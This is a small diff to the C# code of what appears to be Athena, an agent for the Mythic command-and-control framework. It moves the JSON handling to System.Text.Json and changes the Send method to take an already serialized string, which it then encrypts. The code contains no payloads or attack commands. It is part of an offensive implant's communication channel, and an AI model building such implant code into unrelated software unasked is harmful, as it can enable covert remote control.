@@ -1,6 +1,5 @@
 ﻿using Athena.Models.Mythic.Response;
 using Athena.Utilities;
-using Newtonsoft.Json;
 using System;
 using System.Linq;
 using System.Collections.Concurrent;
@@ -11,6 +10,7 @@ using System.Threading;
 using System.Collections.Generic;
 using Athena.Models;
 using Athena.Models.Config;
+using System.Text.Json;
 
 namespace Athena
 {
@@ -123,7 +123,7 @@ namespace Athena
         }
 
         //Send, wait for a response, and return it to the main functions
-        public async Task<string> Send(object obj)
+        public async Task<string> Send(string json)
         {
             if (!connected)
             {
@@ -132,7 +132,6 @@ namespace Athena
 
             try
             {
-                string json = JsonConvert.SerializeObject(obj);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
